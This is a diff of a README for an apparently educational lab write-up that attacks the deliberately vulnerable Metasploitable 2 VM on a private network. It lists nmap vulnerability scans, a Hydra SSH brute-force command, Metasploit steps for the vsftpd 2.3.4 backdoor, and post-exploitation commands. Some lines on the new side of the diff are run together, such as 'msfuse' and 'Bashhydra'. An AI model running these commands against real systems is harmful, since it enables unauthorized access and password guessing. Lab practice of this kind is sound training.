@@ -1,82 +1,81 @@
-# Practical Exploitation of Metasploitable 2 using Metasploit Framework
+Practical Exploitation of Metasploitable 2 using Metasploit Framework
 
 **Author:** Hasnain Unar  
-**LinkedIn:** https://www.linkedin.com/in/hasnain-unar-0379383a2/  
-**GitHub:** https://github.com/Hasnain1675  
+**LinkedIn:** [Hasnain Unar](https://www.linkedin.com/in/hasnain-unar-0379383a2/)  
+**GitHub:** [Hasnain1675](https://github.com/Hasnain1675)  
 **Date:** June 2026
 
-## Project Overview
+---
 
-This project demonstrates a complete ethical penetration testing lifecycle on Metasploitable 2 - a deliberately vulnerable Linux machine. The main goal was to simulate real-world attack scenarios including reconnaissance, brute force, remote exploitation, and post-exploitation using industry standard tools.
+## 📋 Project Overview
 
-**Target IP:** 10.0.2.4  
-**Attacker IP:** 10.0.2.15 (Kali Linux)
+This project demonstrates a complete ethical penetration testing lifecycle on Metasploitable 2, a deliberately vulnerable Linux machine.
 
-## Objectives
+**Target IP:** `10.0.2.4`  
+**Attacker IP:** `10.0.2.15` (Kali Linux)
 
-- Perform detailed reconnaissance and vulnerability scanning
-- Execute brute force attack on SSH service
-- Exploit vsftpd 2.3.4 backdoor using Metasploit Framework
-- Gain Meterpreter access and perform post-exploitation
-- Document the full attack chain professionally
+---
 
-## Lab Setup
+## 🎯 Objectives
 
-- Attacker Machine: Kali Linux (Latest)
-- Target Machine: Metasploitable 2 (Ubuntu 8.04)
+- Reconnaissance and vulnerability scanning
+- Brute force attack on SSH service
+- Remote exploitation using Metasploit
+- Post-exploitation activities
+
+---
+
+## 🛠️ Lab Setup
+
+- Attacker: Kali Linux (Latest)
+- Target: Metasploitable 2 (Ubuntu 8.04)
 - Virtualization: Oracle VirtualBox
 - Network: Host-Only Adapter
 
-## Attack Phases
+---
 
-### 1. Reconnaissance
+## 🔍 Attack Phases
+
+### Phase 1: Reconnaissance
+```bash
 nmap -sV -O 10.0.2.4
 nmap --script vuln 10.0.2.4
-
-Key Finding: vsftpd 2.3.4 Backdoor (CVE-2011-2523) on port 21
-
-### 2. Brute Force Attack
-Tool: Hydra
-
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://10.0.2.4
-
-Result: Successfully cracked msfadmin:msfadmin
-
-### 3. Exploitation
-Tool: Metasploit Framework (msfconsole)
-
-use exploit/unix/ftp/vsftpd_234_backdoor
+Phase 2: Brute Force Attack
+Bashhydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -vV ssh://10.0.2.4
+Phase 3: Exploitation
+msfuse exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 10.0.2.4
 set LHOST 10.0.2.15
 set PAYLOAD cmd/unix/interactive
 exploit
+Phase 4: Post-Exploitation
+meterpretersysinfo
+getuid
+whoami
+shell
 
-Result: Meterpreter Session Obtained
+📸 Project Screenshots
+Reconnaissance Phase
+<img src="screenshots/01-nmap-scan.png" alt="Nmap Scan">
+<img src="screenshots/02-vuln-scan.png" alt="Vulnerability Scan">
+Brute Force Phase
+<img src="screenshots/03-hydra-bruteforce.png" alt="Hydra Brute Force Attack">
+Exploitation Phase
+<img src="screenshots/04-vsftpd-exploit.png" alt="vsftpd Exploit">
+<img src="screenshots/05-meterpreter-session.png" alt="Meterpreter Session">
+Post-Exploitation
+<img src="screenshots/06-sysinfo-whoami.png" alt="System Information">
 
-### 4. Post-Exploitation
-Meterpreter Commands:
-- sysinfo
-- getuid
-- whoami
-- shell
-- ps
+🛡️ Tools Used
 
-## Tools Used
+Nmap
+Hydra
+Metasploit Framework
+Meterpreter
 
-- Nmap (Reconnaissance & Vulnerability Scanning)
-- Hydra (Brute Force)
-- Metasploit Framework (Exploitation)
-- Meterpreter (Post-Exploitation)
 
-## Key Learnings
-
-- Critical impact of outdated services and weak passwords
-- Practical usage of Metasploit Framework
-- Difference between brute force and direct exploitation
-- Importance of proper system hardening
-
-## Ethical Note
-
-This project was performed strictly in an isolated virtual lab environment for educational purposes only. No real systems were targeted or harmed.
+🔒 Ethical Note
+This project was performed in an isolated virtual lab environment for educational purposes only.
 
 Made with passion for Cybersecurity 🔥
+text
